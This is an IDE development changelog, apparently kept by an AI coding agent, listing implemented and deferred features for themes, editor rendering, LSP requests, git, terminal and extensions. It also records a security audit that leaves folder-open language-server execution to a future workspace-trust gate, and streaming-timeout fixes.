20. **[P1] Theme UI key coverage ~50 vs VS Code's ~400+.** Missing entire scope groups: `editorSuggestWidget.*`, `editorHoverWidget.*`, `editorError.foreground`, `editorWarning.foreground`, `gitDecoration.*`, `breadcrumb.*`, `peekView.*`, `merge.*`, `quickInput.*`, `editorGroup*`, `welcomePage.*`, `debug*`, `notifications*`, `extensionBadge.*`, `settings.*`, `editor.wordHighlightBackground`. Imported VS Code themes will look unfinished.
   - **Phase 1 done (2026-05-12):** wrote `hone-themes/tools/expand-keys.ts` which derives ~235 standard VS Code UI keys per theme from each theme's existing palette using hex math (mix, withAlpha, luminance-aware contrast). Ran across all 15 themes → 3525 keys added, every theme now ~315 keys (vs ~80 before). Covers: top-level fallbacks (`foreground`, `focusBorder`, `errorForeground`, `descriptionForeground`), suggest+hover widgets, diagnostics (`editorError/Warning/Info.foreground`, `problemsXXIcon.foreground`), inlay hints, overview ruler, editor groups, breadcrumbs, git decorations (M/A/U/?/!/C/R/staged), peek view, merge conflict resolution, quick input, welcome page, debug toolbar+icons+console, notifications, extensions, settings UI, status bar interaction, tab borders, list/tree extras, input validation, diff editor extras, menus, charts. Expanded `REQUIRED_UI_COLORS` in `tests/coverage.test.ts` from 24 → ~80 mandatory keys. 1336 theme tests pass (up from 452).
21. **[P1] No minimap render.** `view-model/minimap.ts` produces data; settings has a toggle (`settings-panel.ts:640`); no Rust renderer in `native/macos/`. Done: implement minimap drawer + scroll-overview + git decoration overlays.
22. **[P1] No bracket pair colorization.** `syntax-engine.ts:391` has a matching table only.
   - **Phase 1 done (2026-05-12):** `tree_sitter_bridge.rs::apply_bracket_pair_levels` post-processes `punctuation.bracket` leaf tokens after the walk, walking the byte stream in source order — each opener increments a depth counter and gets the *pre*-increment level, each closer decrements then reuses the *post*-decrement level so matching pairs always share a color. Levels cycle 0→1→2→0. `scope_for()` emits `punctuation.bracket` for all `(){}` `[]` leaf kinds across every wired grammar. `resolveTokenScope` in `core/tokenizer/token-theme.ts` maps `punctuation.bracket.level0/1/2` to `tokens.regexp` / `tokens.tagName` / `tokens.atom` — three slots every shipped theme already populates. Demo run confirms `level0/1/2` cycle correctly for nested braces and parens.
23. **[P1] No indent guides** (active or inactive).
   - **Phase 1 done (2026-05-12):** added an indent-guide pass to `editor_view.rs`'s main draw loop. For each visible line: scan leading whitespace, compute visual column of first non-blank byte, draw thin vertical lines (1px, alpha 0.35, neutral cool color) at every `tab_size=4` multiple up to that column. Pure-whitespace lines draw guides up to their trailing column so blank gaps inside nested blocks still feel connected. Drawn before text so the glyphs paint over the lines. `cargo build --lib` clean. Active-indent highlight (different alpha on the scope containing the cursor) and reading `tab_size` from settings are follow-ups.
24. **[P1] No sticky scroll.** Standard VS Code feature for the last 2 years.
   - **Phase 1 done (2026-05-12):** TS-side implementation, no Rust changes. A small `stickyScrollRow` widget lives between the breadcrumb bar and the editor view. The 500ms `pollDirtyState` tick runs `updateStickyScroll()` which walks up from the cursor line in the buffer, picks the most recent line with strictly smaller indent (skipping blank lines), and renders it in the row. The row hides itself when the cursor is at indent 0 or when no parent scope is found. Display capped at 120 chars. Heuristic-based (indent only); tree-sitter-aware scope detection for languages where indent is irrelevant (e.g. braced C-style with everything at column 0) is a follow-up.
25. **[P1] No editor splits / editor groups.** `GridNode` (`layout/grid.ts`, 254 LOC) and `TabManager` (398 LOC) are written but never imported by `render.ts` (which uses `views/tabs/tab-bar.ts` module-level state). Done: either wire `TabManager` + `GridNode` into render and add split commands, or delete the dead modules.
26. **[P1] No drag-to-reorder / pin / preview / overflow on tabs.** `tab-bar.ts:205` rebuilds buttons; no drag, no pin column, no italic preview state, tabs past viewport are unreachable. Done: drag handlers, pinned column on left, italic preview replaced on real-edit, overflow chevron with dropdown.
   - **Phase 3 done (2026-05-13):** pin/unpin shipped. New `tabPinned: number[]` parallel array; `pinTab(idx)` / `unpinTab(idx)` exports update it and trigger a rebuild. Per-tab right-click menu now leads with `Pin Tab` (or `Unpin Tab` when already pinned), followed by the existing Close/Close Others/Close All. Pinned tabs render before unpinned ones — `rebuildTabBarDirect` builds the per-tab wrappers in source order (so `tabBarButtons[srcIdx]` stays source-indexed for `applyTabColors`), then `widgetAddChild`s in render order (pinned first, then unpinned, both source-insertion order within group). The file-type icon is replaced with `pin.fill` on pinned tabs as a visual marker. Pin state persists across restarts via a new `lastPinnedTabs` setting (`1`/`0` mask matching `lastOpenTabs`'s order); render.ts restore loop calls `pinTabImpl(pi)` for each `1` after tabs are reopened. Close/close-others/close-all all splice the pinned mask alongside `openTabs`. Drag-to-reorder needs perry-ui drag-event FFI (queued for v1.1). Preview state (italic tab from quick-open, promoted on edit) deferred — needs an edit-event hook the editor doesn't expose to host yet. Overflow chevron needs widget-width measurement (no FFI today) — for v1 the tab bar wraps via Spacer; visible cap is the natural width of the bar.

### LSP — wire missing requests

27. **[P1] Wire `references` (`lsp-bridge.ts`).** Capability declared, no IDE call.
   - **Phase 2 done (2026-05-12):** `lspReferences(filePath, line, character, includeDeclaration)` builds the `textDocument/references` JSON-RPC request; response routed through `handleReferencesResponse` to a `setReferencesCallback(json)` consumer (raw LSP Location[] JSON). The capability is now advertised in the initialize handshake (`textDocument.references`).
   - **Phase 2 consumer UI done (2026-05-12):** new `views/references-peek/references-peek.ts` (~230 LOC) takes over the sidebar when references arrive. Parses both `Location[]` and `LocationLink[]` JSON (hand-rolled extractor; tolerates either `uri`+`range` or `targetUri`+`targetSelectionRange`). Groups consecutive entries by file, renders `Line N, Col M` rows, click jumps via `setReferencesJumpHandler` → `openFileInEditor` + `setCursorPosition` after a 32ms layout delay. Caps at 500 results. Right-click "Find All References" now lands in a dedicated panel instead of a notification.
28. **[P1] Wire `rename`.** Capability declared, no UI.
   - **Phase 2 done (2026-05-12):** `lspRename(filePath, line, character, newName)` issues `textDocument/rename`; response delivers the WorkspaceEdit JSON to `setRenameCallback`. Newname escaping handles `"`, `\`, `\n`. Capability advertised. UI (F2 inline rename + preview + apply WorkspaceEdit) is a follow-up.
   - **Phase 2 apply done (2026-05-13):** `onRenameResult` now actually applies the WorkspaceEdit via the new `applyWorkspaceEdit(json)` helper (shared with #29's code-action picker). The helper walks every URI in `changes`, parses TextEdits, sorts them in reverse line/char order, and applies — using `editor.setContent` for the active buffer and `writeFileSync` otherwise. Single-line and multi-line ranges supported. Returns a `{appliedFiles, appliedEdits, skippedFiles}` count surfaced to the user via notification. Multi-file rename works for any LSP that emits the `changes` form (most TypeScript-Language-Server / tsgo / rust-analyzer responses). `documentChanges` form (with versioned text documents + file creates / deletes) still v1.1.
29. **[P1] Wire `codeAction` + lightbulb.**
   - **Phase 2 done (2026-05-12):** `lspCodeActions(file, startLine, startCol, endLine, endCol, diagnosticsJson)` issues `textDocument/codeAction` with diagnostics in the context so the server surfaces "fix this" actions. `setCodeActionsCallback` delivers the actions JSON. Initialize handshake advertises `codeActionLiteralSupport` with `quickfix`, `refactor`, `source` kinds. UI (gutter lightbulb + Cmd+. menu) is a follow-up.
   - **Phase 2 picker UI done (2026-05-13):** when the LSP returns one or more CodeActions, the sidebar swaps to a `CODE ACTIONS` panel via the existing takeover pattern. Each row is the action's `title` as a clickable button. Click invokes `applyCodeAction(idx)` which: parses `edit.changes[uri][i]` into TextEdit objects (range + newText), sorts them in reverse line/char order so offsets don't shift, and applies via either `editor.setContent` (active buffer) or `writeFileSync` (other files). Multi-file WorkspaceEdits and command-based actions surface "v1.1" notifications — they need cross-tab buffer sync and `workspace/executeCommand` plumbing respectively. Floating gutter lightbulb still v1.1 (needs Rust draw + gutter-click FFI in editor_view). The right-click `Quick Fix…` and the existing `editor.action.quickFix` command both now land in this picker instead of just announcing the count.
30. **[P1] Wire `documentSymbol` + outline view.**
   - **Phase 2 done (2026-05-12):** `lspDocumentSymbols(filePath)` issues the request; `setDocumentSymbolsCallback` delivers the symbol JSON. Outline panel built at `hone-ide/src/workbench/views/outline/outline-panel.ts` (~240 LOC) — parses both hierarchical `DocumentSymbol` and flat `SymbolInformation` results, renders a tree-indented list, click jumps the editor to the symbol's selectionRange via `setOutlineJumpHandler`. Initialize handshake advertises `hierarchicalDocumentSymbolSupport`. Quick Open `@` prefix integration is a follow-up.
   - **Phase 2 wiring done (2026-05-12):** `displayFileContent` now calls `setOutlineActiveFile(filePath)` after every `lspDidOpen`, so opening a file pre-fetches symbols. A new `view.outline` command (registered in `commands.ts`, dispatched in `native-menu.ts` length-12 charCodeAt(5)=='o' branch) mounts the outline panel in the sidebar via the takeover pattern; jump handler reuses `openFileInEditor` + `setCursorPosition` like the references peek.
31. **[P1] Wire `workspaceSymbol`.**
   - **Phase 2 done (2026-05-12):** `lspWorkspaceSymbols(query)` issues `workspace/symbol`; `setWorkspaceSymbolsCallback` delivers the SymbolInformation[] JSON. `workspace.symbol` capability advertised in init. Quick Open `#` prefix integration is a follow-up.
32. **[P1] Wire `semanticTokens`.**
   - **Phase 2 done (2026-05-12):** `lspSemanticTokens(filePath)` issues `textDocument/semanticTokens/full`; response routed through `handleSemanticTokensResponse` to `setSemanticTokensCallback`. Init handshake advertises 22 token types + 10 modifiers (the LSP standard set) with `formats: ["relative"]`. Editor overlay renderer (paint semantic-token colors on top of tree-sitter scopes) is v1.1 — keeps the request layer ready for when the renderer lands.
33. **[P1] Wire `inlayHints`.** Settings exist (`typescript.inlayHints.*`) but no LSP call or render.
   - **Phase 2 done (2026-05-12):** `lspInlayHints(file, startLine, startCol, endLine, endCol)` issues `textDocument/inlayHint`; `setInlayHintsCallback` delivers InlayHint[] JSON. `inlayHint.dynamicRegistration:false` advertised. Editor-side decoration renderer is a follow-up.
34. **[P1] Hover renders plain text only.** `lsp-bridge.ts:407` advertises `contentFormat: ['plaintext']`.
   - **Phase 2 done (2026-05-12):** init handshake now advertises `["markdown", "plaintext"]` so servers return MarkupContent.
   - **Phase 3 follow-up (2026-05-12):** added `stripMarkdown` pre-pass in `hover-popup.ts` that strips code fences, inline backticks, bold/italic markers, link syntax, and heading hashes — so the popup reads as clean prose even when the server returns markdown. Full block rendering through the chat markdown engine remains a follow-up for v1.1.
   - **Phase 6 full markdown done (2026-05-13):** the doc body of hover content (everything after the first newline — the LSP convention is "signature line then docs") is now routed through `renderMarkdownBlock` from the chat renderer. Code fences become monospace blocks, `**bold**` / inline backticks / `[link](url)` / lists / tables / blockquotes all render with proper styling. The signature line is still stripped + rendered monospace+bold for readability. New `setHoverThemeColors(colors)` setter + colors-captured-on-create pattern means the renderer has the theme it needs without plumbing colors through every showHoverPopup call. Fallback to `stripMarkdown` + plain Text when colors haven't been pushed yet (defensive — shouldn't trigger).
35. **[P1] Format-on-save / on-type / on-paste.** Range/full doc works; trigger characters and save hook do not. Done.

### Workbench / UX

36. **[P1] Quick Open is fragmented + lacks prefixes.** `views/quick-open/quick-open.ts` (254 LOC) is unused; the active `goToFileAction` (`render.ts:877`) is a sidebar-replacing minimal reimpl. No `@` / `#` / `:` prefix routing.
   - **Phase 2 partial done (2026-05-12):** `:` prefix routes to a line-jump button in the existing Quick Open. `renderGoToFileListDeferred` detects the prefix and swaps the result list for a `Go to line N` Button that calls `jumpToLineInActiveEditor`. `@` (document symbols) and `#` (workspace symbols) still TODO — both LSP requests are wired but need a per-tab snapshot pipeline. Replacing the takeover with a centered overlay is the Phase 8 polish.
   - **Phase 2 complete (2026-05-13):** `@<query>` now fires `lspDocumentSymbols(currentEditorFilePath)` on first keystroke, registers a one-shot `setDocumentSymbolsCallback` that caches the JSON, and re-filters in-memory on each subsequent keystroke. `#<query>` (min 2 chars) fires `lspWorkspaceSymbols(query)` and renders the SymbolInformation results — click jumps via `openFileInEditor` + `setCursorPosition`. New `extractFlatSymbols(json)` accepts both `DocumentSymbol[]` (hierarchical with `selectionRange`/`range`) and `SymbolInformation[]` (flat with `location.uri` + `location.range`). Findlosing-brace + JSON string/number extractors are hand-rolled (Perry-safe — no JSON.parse on deeply nested LSP responses). Opening quick-open resets the symbol caches so a stale `@` from a prior session can't render. Tradeoff: while `@` is active in quick-open, the outline panel's `setDocumentSymbolsCallback` is overridden — it re-registers on next mount.
37. **[P1] Sidebar not resizable.** Hardcoded `widgetSetWidth(sidebar, 220)` (`render.ts:5317`). No drag handle, no persisted width.
   - **Phase 3 done (2026-05-12):** added `sidebarWidth: number` to `WorkbenchSettings` (default 220, clamped 120–800), persisted via the existing INI loop. `widgetSetWidth(sidebar, settings.sidebarWidth)` honors it at render. Mouse-drag handle on the sidebar divider is queued for v1.1 once Perry exposes widget-edge drag-event FFI; users can change the width from `~/.hone/settings.ini` (`sidebarWidth=N`) or via Settings → UI today.
38. **[P1] Activity bar location setting lies.** `WorkbenchSettings.activityBarLocation: 'side'|'top'|'bottom'|'hidden'` declared (`settings.ts:21`) but `renderActivityBarDesktop` is hardcoded left.
   - **Phase 3 done (2026-05-12):** `mainRow` honors `activityBarLocation === 'hidden'` and hides the activity bar via `widgetSetHidden`. `'side'` is the existing default. `'top'`/`'bottom'` need a horizontal activity-bar widget (the desktop one is vertical), deferred to a follow-up. Existing iPad compact / split layouts already build their own horizontal activity bars, so the desktop top/bottom modes can re-use those builders later.
39. **[P1] Sidebar left/right is unimplemented.** Same — setting exists, render is hardcoded.
   - **Phase 3 done (2026-05-12):** `mainRow` in `render.ts` now checks `settings.sidebarLocation` (`'r'`ight first-char) and swaps the HStack to `[activityBar, editorArea, sidebarBorder, sidebar]` when right-aligned. Default `'left'` preserves the existing layout. Activity bar deliberately stays on the left — VS Code mirrors only the sidebar; the activity bar is a separate setting (#38). Requires app relaunch to apply (the live re-layout on settings change is a follow-up).
40. **[P1] Notification system holds one toast.** `pendingDismiss: unknown = null` (`notifications.ts:34`). Posting a second toast loses the first.
   - **Phase 3 done (2026-05-12):** rewrote `views/notifications/notifications.ts` (~125 LOC) — each toast owns a monotonic `id` and registers in parallel `_ids/_widgets/_intervals` arrays, indexed by id. Each toast has its own auto-dismiss `setInterval`, so a second toast no longer hijacks the first one's timer. Stack capped at 5 toasts — when the cap is hit the oldest is evicted to keep the newest visible. New exports: `getNotificationCount()`, `clearAllNotifications()`. Persistent notification drawer with history is the next polish step.
41. **[P1] No user keybindings file.** `keybindings.ts` is hardcoded; no `~/.hone/keybindings.json` reader.
   - **Phase 3 done (2026-05-12):** new `hone-ide/src/user-keybindings.ts` (~190 LOC). `loadUserKeybindings(appDataDir, platform)` reads `${appDataDir}/keybindings.json` in VS Code's shape (`[{ "key": "ctrl+shift+p", "command": "...", "when"?: "..." }]`); parses chord strings (`cmd+k cmd+s`); resolves `cmd`/`meta`/`super`/`win`/`cmdorctrl`/`option`/`control` aliases; normalizes `esc`/`ins`/`del`; produces `Keybinding` objects with prettified display strings. `getEffectiveKeybindings(platform, appDataDir)` returns user bindings followed by defaults so `matchKeybinding`'s first-match wins for the user. Hand-rolled object-array extractor avoids depending on `JSON.parse` for Perry compat. Visual keybindings editor + native-menu shortcut sync remain follow-ups.
42. **[P1] No workspace-level settings.** Single `~/.hone/settings.ini`.
   - **Phase 3 done (2026-05-12):** new `applyWorkspaceOverlay(root)` in `settings.ts` reads `${root}/.hone/settings.ini` (KEY=VALUE, comment lines start with `#`) and overrides a curated subset of settings for the session — never persists, never globals. Whitelist (`WORKSPACE_OVERRIDABLE`) covers: theme, font family/size, tab size, insert-spaces, line numbers, word wrap, minimap, format-on-save, cursor style, auto-save, trim whitespace, insert/trim final newline, AI inline completion enable/delay, search ignore/symlink, terminal font/cursor. Sensitive globals (AI API keys, sync tokens, telemetry choice, setup-complete) are intentionally NOT overridable — a project shouldn't be able to repoint your AI provider or flip your privacy toggle behind your back. Listener notification fires when any key applied. `isWorkspaceOverlayActive()` / `getWorkspaceOverlayRoot()` exposed. `onFolderOpened` in `render.ts` calls the overlay before panels read settings; same on initial workspace restore. Hot file-watch reload is a follow-up.
43. **[P1] Session restore is shallow.** Tabs + folder persist; cursor positions, scroll, panel state, terminal state do not.
   - **Phase 3 done (2026-05-12):** added three settings keys — `lastActiveCursorLine`, `lastActiveCursorCol`, `lastActiveScrollTop` — to `WorkbenchSettings` and the persistence loop. `pollDirtyState` now calls `persistEditorCursorState()` every 500ms; the snapshotter compares to last-written values and skips writes when unchanged so the settings file doesn't churn. Editor exposes `setCursorPosition(line, col)`, `getScrollTop()`, `setScrollTop()` for the IDE to drive. After `displayFileContent` of the active tab on launch, render.ts schedules a `setTimeout(32)` that applies the saved cursor + scroll, then re-renders. Per-tab cursor (rather than just the active tab) + panel/terminal state restore remain follow-ups.

### Git / SCM

44. **[P1] Merge conflict resolution UI.** `unmerged` status parsed but no 3-way diff, no "accept current / incoming / both", no marker rendering.
   - **Phase 3 done (2026-05-12):** inline conflict-resolver toolbar (new `conflictBar` between breadcrumb and sticky-scroll row). On every 500ms poll tick `detectConflicts()` scans the active buffer for `<<<<<<<` / `=======` / `>>>>>>>` triples (line-start `<<<<<<<` only, ignores text mentions). Records `(startOff, sepOff, endOff)` arrays. When ≥1 conflict found, toolbar shows the count plus three buttons. Accept Current / Incoming / Both runs `resolveConflict(choice)` which finds the conflict closest to the cursor, slices the marker lines out, replaces with the chosen body, and writes the buffer back via `setContent`. Re-detect runs 32ms later so the toolbar auto-hides once all conflicts are resolved. v1 limitation: no 3-way diff view (separate panel for ours/theirs side-by-side) — toolbar is the in-place workflow.
45. **[P1] Hunk-level stage / unstage.** Hunks parsed in `diff.ts` but no UI applies `git apply --cached`. Done: hunk-action buttons in diff view.
46. **[P1] Multiline commit + amend + sign-off.** Single-line `TextField` only (`git-panel.ts:714`). Done: multiline editor, "Amend" checkbox, "Sign-off" toggle.
   - **Phase 3 done (2026-05-13):** the single commit field is now a title field plus an optional `Description (optional)` body field — `gitCommit()` builds `['commit', ...maybe('--amend'), ...maybe('-s'), '-m', title, '-m', body]` via argv-form spawn so backticks/quotes/`$` in either field can't inject. A standalone two-button options row (`Amend` / `Sign-off`) toggles `--amend` and `-s`; the toggle state is shown by suffixing `✓` to the button label (no platform-specific checkbox widget — perry/ui doesn't expose one yet). Amend resets after a successful commit (single-shot, matches VS Code); Sign-off sticks until the user clicks it off. Amend additionally relaxes the "must have staged changes + title" guard so users can rewrite a commit's body or just append a sign-off. True rich multiline editor (with newline-aware text input) is deferred until perry/ui exposes a TextArea — the body field captures one paragraph of free text, which covers the dominant use case.
47. **[P1] Branch picker UI.** No way to switch/create/delete/rename branches without dropping to terminal. Done: branch picker accessible from status bar and git panel.
   - **Phase 3 done (2026-05-13):** the `Branches` toggle in the git panel now opens with a `New branch…` text field + `Create + switch` button (runs `git checkout -b <name>`) at the top. Each non-current branch row gets a per-row `Delete` (runs `git branch -d`, surfaces failures by leaving the branch in the list). The current branch is non-deletable per git's own constraint, so the affordance is hidden. Status bar branch button (#97) already routes to the SCM panel, which lands the user in this picker. Rename (`git branch -m`) deferred to v1.1 — needs a per-row rename prompt; perry/ui doesn't expose a modal text-input dialog and the Mac osascript path isn't portable to Windows (followup §5).
48. **[P1] Stash list, apply, drop.** Push/pop buttons exist (`git-panel.ts:746-755`); no list UI. Done.
   - **Phase 3 done (2026-05-13):** new `Stashes` button between Pop and Branches toggles a list driven by `git stash list`. Each row shows the full stash line ("stash@{N}: WIP on branch: hash msg") with per-row `Apply` (runs `git stash apply stash@{N}`, refresh via `onGitActionComplete`) and `Drop` (runs `git stash drop stash@{N}`, then `rerenderStashesList` keeps the list open). Both ops route through `gitSpinnerBegin/End` (#93). Empty state shows "No stashes." All git invocations are argv-form via `spawnSync`, matching #1's hard rule. No Rust changes, no platform-specific paths — works on Windows + macOS.
49. **[P1] Per-file blame & per-file log.** Inline EOL blame works (`render.ts:1851-1957`); no gutter, no per-file history. Done: gutter blame + per-file log view.
50. **[P1] `.gitignore`-aware explorer.** Currently shows `node_modules`, `.git`, etc. unless explicitly excluded. Done: parse `.gitignore`, hide ignored files by default, toggle to show.
   - **Phase 3 done (2026-05-13):** instead of hand-rolling .gitignore globbing (negation, nested ignores, `**`), the git panel's status refresh now invokes `git status --porcelain=v2 --ignored`, capturing `!`-prefixed rows into a new `gitIgnoredPaths` list (parallel field added to `GitRefreshResult`). The git panel exports `isPathGitIgnored(relPath)` which exact-matches against the list and prefix-matches directory entries (git appends `/`). Sidebar's `readdirSync` loop computes each child's workspace-relative posix path (normalizing `\` → `/` for Win), calls `isPathGitIgnored`, and skips ignored entries when the new `explorerRespectGitignore` setting is on. Setting defaults to true; persists via the standard INI loop; pushed through `setSidebarRespectGitignore` on init + on every settings change. Outside a git repo, `gitIgnoredPaths` stays empty so nothing is filtered (no false positives). Negation rules, nested .gitignore, and tracked-then-ignored files all flow through git's own semantics for free.

### Terminal

51. **[P1] Multiple terminals + splits.** Single global handle `termHandle: number = 0` (`terminal-panel.ts:42`). Done: tab list + horizontal split.
52. **[P1] Shell profiles.** Hardcoded `'/bin/zsh'`. Done: profile registry in settings (zsh/bash/fish/custom command).
   - **Phase 3 done (2026-05-13):** new `terminalShell: string` setting (default `''` = platform default). Persisted via the standard INI loop and is on the workspace-overlay whitelist so a repo can pin its preferred shell via `.hone/settings.ini`. `terminal-panel.ts` now reads `s.terminalShell`; falls back per `__platform__`: Windows → `powershell.exe`, Linux → `/bin/bash`, else `/bin/zsh`. Also fixed the previous-agent literal `/Users/amlug` cwd fallback — now uses `process.env.HOME` (Unix) or `process.env.USERPROFILE` (Windows), then `process.cwd()`. Multi-profile picker UI (zsh + bash + fish presets with named profiles) deferred to v1.1; a single configurable shell command covers 95% of users.
53. **[P1] Link detection.** No file:line or URL pattern matching, no click-to-open. Done: regex scan output lines, render as links.
54. **[P1] Resize wired to layout.** `hone_terminal_resize` FFI exists but not invoked on panel resize. Done.
   - **Phase 3 done (2026-05-13):** PTY grid is now settings-driven. New `terminalRows` (default 30, clamped 4-200) and `terminalCols` (default 120, clamped 40-500) replace the hardcoded `14 x 80`. The terminal panel reads them on open, caches `termCurrentRows/Cols`, and registers a one-time `onSettingsChange` listener that calls `hone_terminal_resize(handle, rows, cols)` whenever either value changes (no-op if unchanged). Workspace-overlay-whitelisted so a project can pin its own terminal size via `.hone/settings.ini`. Exposed `resizeTerminal(rows, cols)` for future callers (e.g. when a Win32 WM_SIZE handler lands in perry-ui-windows, render.ts can wire the actual layout-driven resize). Auto-resize on window drag still needs the desktop `perry_on_layout_change` callback (platform.ts:313 — TODO Win32 WM_SIZE / NSWindowDidResize); for now the user can re-fit by editing settings or accepting the larger default that fills most panels.
55. **[P1] Persistent sessions.** Killed on `destroyTerminalPanel`. Done: save scrollback + reopen.

### Extensions

56. **[P1] `@honeide/api` namespaces have no runtime implementation.** 1115 LOC of `export declare`. Plugins can compile but the IDE doesn't surface `commands`, `workspace`, `ui`, `languages`, `debug`, `terminal`, `ai`, `sync` at runtime. Done: implement runtime objects matching the declared API; provide a working "hello world" plugin.
57. **[P1] Persist extension enable/disable.** `ext0on..ext10on` flags are in-memory only.
   - **Phase 3 done (2026-05-13):** new `extensionsEnabledMask: number` setting (default 2047 = all 11 builtin extensions on) persists across restart. `decodeEnabledMask(mask)` hydrates the 11 module-level flags on first mount; `encodeEnabledMask()` re-encodes on each toggle; `setNumberSetting('extensionsEnabledMask', mask)` flushes to disk via the existing settings loop. No relaunch needed for changes to take effect.
58. **[P1] Workspace trust model.** Not present; required before allowing third-party plugins to run on a new folder.
   - **Phase 5 done (2026-05-12):** new `workspace-trust.ts` (~120 LOC) manages `${appDataDir}/trusted-workspaces.ini` (one absolute path per line, `#` comments allowed). Exposes `isWorkspaceTrusted`, `trustWorkspace`, `revokeWorkspaceTrust`, `listTrustedWorkspaces`. Two commands registered: `workspace.trust` / `workspace.revokeTrust`. v1.0 ships the registry; the plugin host gates activation on `isWorkspaceTrusted(workspaceRoot)` when the `@honeide/api` runtime lands in v1.1 (#56).
   - **Iter 80 audit mapping (2026-05-16):** the iter-76/78/79 hostile-input sweep's auto-exec-on-folder-open audit confirms `onFolderOpened` runs **no task** (tasks-panel `spawnBackground` is reachable only via explicit user click / command-palette `runBuildTask` — full call graph traced, no auto-run-on-open) — so a malicious repo's `.hone/tasks.json` populates the list but executes nothing until the user acts (acceptable, matches VS Code-without-runOn). **However** `onFolderOpened` → `initLspBridge()` auto-spawns the project-local language server (`node_modules/.bin/tsgo|typescript-language-server`, preferred over global). A cloned malicious repo with a poisoned local LSP binary therefore gets code execution on folder-open with no user interaction. This is NOT a new/separately-fixable bug: it is the canonical ecosystem-wide "opening an untrusted repo runs its local toolchain" hazard that Workspace Trust exists to gate (VS Code gates LSP/extension/task activation behind exactly this trust prompt). The correct fix is wiring `isWorkspaceTrusted(workspaceRoot)` as a gate in front of `initLspBridge()` (and, when it lands, the plugin host + any task auto-run) — a structural change of the same shape as the v1.1 plugin-host gating already noted above, **not** a /loop-sized patch (a partial TS fix would either break LSP for the 99.9% benign case or be a non-fix). Recorded so this is consciously mapped to #58, not overlooked: **the iter-76/78/79 fixes confine external→filesystem *writes*, but external→*process-spawn* on folder-open remains gated only by the (not-yet-wired) workspace-trust model.** Closing #58's trust-gating is the single highest-leverage remaining security item and should be prioritized in the v1.1 trust/crypto rework alongside #3/#4.

**Iter 81 — full-app regression verification (2026-05-16):** no code change. After ~50 iterations of accumulated edits across 58 files, ran `perry compile --target windows` and grepped for compile/verifier/panic/undefined-symbol errors — **zero** (only the expected iter-47 i18n warnings). The entire accumulated change set compiles cleanly together: no cross-file breakage, no stale references, no verifier regressions. 58 uncommitted entries (src/, en.json, config, docs), correctly uncommitted per followup.md §7 (no commit requested across all iterations). Recorded as the directive's "make sure the app works" health check — it passes at the build level.

**Iter 82 — streaming AI response truncated when stream closed with >50 lines buffered (2026-05-16):** fresh robustness audit of the SSE/streaming path (`chat-panel.ts::pollStreamTick`). The per-16ms-tick drain loop caps at 50 lines — correct as a UI-responsiveness guard (don't block the render thread). But the **final drain pass after the stream reports done** (`statusAfter >= 2`) *also* had a `for (drain2 = 0; drain2 < 50; ...)` cap. When a stream closes with >50 SSE lines still in the native tokio buffer — routine for a long code-heavy final answer where each token-delta is its own `data:` line, and the close often coincides with a large buffered backlog — lines 51+ were never `processCurrentLine()`'d before `finishStream()`, **silently truncating the tail of the assistant message in both the live display and the saved transcript**. Same silent-data-loss shape as the iters 60–75 sweep but on the AI-response path. Fixed: the final drain now loops until `streamPoll` returns empty (with a 1e6 defensive bound that's far above any real SSE line count and guarantees no pathological infinite loop). Safe because `status>=2` means the stream is finished, so the buffer is finite and drains to empty. The per-tick cap is intentionally kept (responsiveness; those lines just arrive next tick). The auto-title stream path was checked and left as-is: it self-splits each poll chunk with a correct tail-handling full-scan and is low-stakes (a short title, never data loss) — cross-chunk buffering there would add risk for negligible benefit. Build verifier-clean.

**Iter 83 — AI chat permanently stuck on network stall (no stream timeout) (2026-05-16):** continued the streaming-path audit into error/stall handling. `finishStream()` does correct cleanup and an explicit stream *error* is handled (status 3 is `>= 2`, so it finalizes). But there was **no inactivity timeout**: `streamStart` → `setInterval(pollStreamTick, 16)`, and `pollStreamTick` only finalizes when `streamStatus >= 2`. If the connection stalls without closing — provider goes silent but keeps the socket open, a corporate proxy buffers indefinitely, or the native tokio reader hangs — `streamStatus` stays at 0/1 forever: `finishStream()` never fires, the "thinking" indicator spins permanently, the 16ms poll timer busy-spins forever, and the **only recovery is restarting the whole IDE** — with no error ever shown. A flaky network or a hung provider endpoint thus bricks the chat panel. Added an inactivity watchdog: module-level `_streamLastDataMs` set at stream start and refreshed whenever any line is drained; in `pollStreamTick`, when `status < 2` and `Date.now() - _streamLastDataMs > 90000`, surface a timeout message (`[Connection timed out — response may be incomplete.]` appended if partial text was already received, else a standalone "request timed out, check your network" message) and call `finishStream()` for full cleanup. 90s is deliberately generous — AI providers emit incremental SSE events well within that even during long tool/thinking pauses, so the watchdog only trips on a genuinely dead connection, never a slow-but-alive one. `Date.now()` (not `new Date()`) per the Perry async constraint; the path is a setInterval callback so it's safe. 2 i18n strings (649→651). Net: the chat can no longer get permanently wedged by a network/provider stall — it times out, tells the user, and cleans up so the next message works. Build verifier-clean.

**Iter 84 — Claude Code subprocess: leaked process + permanent wedge on hang (2026-05-16):** the iter-83 stream-watchdog's sibling, on the *local Claude Code subprocess* path (`claude-process.ts` + `chat-panel.ts::claudePollTick`). `stopClaudeSession()` (which `taskkill`/`kill`s the spawned claude PID) was **never imported or called by chat-panel/render** — only internally by `startClaudeSession` to clean up the *previous* session before a new one. So the poll loop only finalized when claude *exited* (a `kill -0`/`tasklist` liveness probe every ~3s). A hung claude (alive but silent forever — stuck tool call, deadlocked MCP server, network-wedged sub-request) therefore: (a) spun the 50ms poll timer indefinitely, (b) pinned the chat on the thinking indicator, (c) **leaked the claude subprocess** consuming CPU/API tokens for output nobody sees, and (d) doubly trapped the user — session-switch is gated on `claudeModeActive` (so a wedged claude locks them out of *every* other chat session) and there's no cancel wired to `stopClaudeSession`. Worse than iter-83 (which only wedged the UI; this also leaks a process and the gate makes recovery impossible without an app restart). Added a 180s inactivity watchdog mirroring iter-83 (very generous — the local CLI legitimately pauses long during tool execution, so it only trips on a true hang): module-level `_claudeLastDataMs` seeded at session start and refreshed on every data-bearing poll; when exceeded, it calls `stopClaudeSession()` (kills the leaked PID — fixes the leak too), clears the poll timer, finalizes with whatever partial output exists, surfaces a timeout message, and resets `claudeModeActive` so the user is unblocked (can switch sessions / retry). Imported `stopClaudeSession` into chat-panel (was unused). `Date.now()` per Perry async constraint (setInterval callback, safe). 2 i18n strings (651→653). Net: a hung Claude Code session now self-terminates in ≤3 min with the process actually killed, instead of permanently bricking the entire chat panel and leaking a background process. The streaming-robustness thread (iters 82–84) has now closed **three** distinct "chat silently/permanently breaks" failures: response truncation on close (82), API-stream stall wedge (83), subprocess hang wedge + process leak (84). Build verifier-clean.

